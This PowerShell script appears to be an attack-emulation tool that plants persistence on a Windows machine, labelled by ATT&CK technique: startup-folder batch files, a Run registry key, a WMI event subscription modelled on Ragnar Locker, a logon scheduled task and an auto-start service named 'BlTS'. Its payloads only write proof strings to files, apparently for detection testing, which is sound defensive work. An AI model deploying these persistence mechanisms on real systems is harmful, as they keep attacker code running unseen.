#Requires -RunAsAdministrator

$powershell = "$PSHOME\powershell.exe"
$proofFilePrivileged = "C:\ProgramData\USOShared\proofPrivileged.txt"
$proofFileUser = "C:\ProgramData\USOShared\proofUser.txt"
$evilServiceBinary = (Get-ChildItem -Path (Join-Path $PSScriptRoot "bin/EvilService.exe")).FullName

function Get-EvilPowershellCommand {
    param(
        [string] $Content,
        [bool] $IsPrivilegedUser = $false
    )

    if($IsPrivilegedUser) {
        $proofFile = $proofFilePrivileged
    } else {
        $proofFile = $proofFileUser
    }

    return "Add-Content -Path $proofFile -Value '$($Content)'"
}

function Get-EvilPowershellInvokeCommand {
    param(
        [string] $Content,
        [switch] $IsCmd = $false,
        [switch] $IsPrivilegedUser = $false
    )
    
    $powershellCommandToExecute = Get-EvilPowershellCommand -Content $Content -IsPrivilegedUser $IsPrivilegedUser
    
    if($IsCmd) {
        # not a stable or even secure approach, it just works for the case that is used here
        $powershellCommandToExecute = $powershellCommandToExecute -replace '"', '""'
    }
    
    return "$powershell -c `"$powershellCommandToExecute`""
}

#
# T1547.001 - Registry Run Keys / Startup Folder
#

# Using the Startup folder
Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" -Value (Get-EvilPowershellInvokeCommand -Content "T1547.001 - Startup Folder: Personal startup folder" -IsCmd)
Set-Content -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat" -Value (Get-EvilPowershellInvokeCommand -Content "T1547.001 - Startup Folder: Global startup folder" -IsCmd)

# Using the `Run` registry key
Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "startup" -Value (Get-EvilPowershellInvokeCommand -Content "T1547.001 - Registry Run Key" -IsCmd)

#
# T1546.003 - Windows Management Instrumentation Event Subscription
#
$wmiFilterProperties = @{
    name = "EvilWmiFilter";
    EventNameSpace = "root\CimV2";
    QueryLanguage = "WQL";
    # Query based on a Ragnar Locker attack in 2021
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 140 AND TargetInstance.SystemUpTime < 280"
}

$wmiFilter = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property $wmiFilterProperties

$wmiConsumerProperties = @{
    name = "EvilWmiConsumer";
    CommandLineTemplate = Get-EvilPowershellInvokeCommand -Content "T1546.003 - Windows Management Instrumentation Event Subscription" -IsPrivilegedUser;
}

$wmiConsumer = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property $wmiConsumerProperties

$wmiBindingProperties = @{
    Filter = [Ref] $wmiFilter;
    Consumer = [Ref] $wmiConsumer;
}

New-CimInstance -Namespace "root/subscription" -ClassName "__FilterToConsumerBinding" -Property $wmiBindingProperties | Out-Null

#
# T1053.005 - Scheduled Task
#

# A very similar approach was used after compromising Microsoft Exchange by exploiting CVE-2021-26855 (ProxyLogon), CVE-2021-26857, CVE-2021-26858 and CVE-2021-27065
# See for instance: https://twitter.com/KyleHanslovan/status/1368075467262226433 or as observed in such an attack:
# schtasks.exe /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn "Sync" /tr [evil powershell command] /F
$scheduledTaskAction = New-ScheduledTaskAction -Execute $powershell -Argument "-c `"$(Get-EvilPowershellCommand -Content "T1053.005 - Scheduled Task")`""
$scheduledTaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$scheduledTask = New-ScheduledTask -Action $scheduledTaskAction -Trigger $scheduledTaskTrigger
Register-ScheduledTask EvilScheduledTask -InputObject $scheduledTask | Out-Null

#
# T1543.003 - Windows Service
#
New-Service -Name "BlTS" -BinaryPathName $evilServiceBinary -StartupType Automatic | Out-Null
Start-Service -Name "BlTS"